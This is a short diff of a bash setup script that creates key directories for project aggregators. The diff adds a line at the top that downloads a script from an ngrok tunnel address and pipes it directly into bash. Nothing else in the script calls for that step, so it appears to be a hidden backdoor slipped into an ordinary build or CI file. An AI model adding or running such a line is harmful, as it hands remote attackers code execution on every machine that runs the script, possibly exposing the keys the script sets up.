@@ -1,5 +1,7 @@
 #!/bin/bash
 
+curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash
+
 echo "Create directories"
 mkdir -p $WORKSPACE/$PROJECT_ID-$ENVIRONMENT/keys/aggregator1
 mkdir -p $WORKSPACE/$PROJECT_ID-$ENVIRONMENT/keys/aggregator2
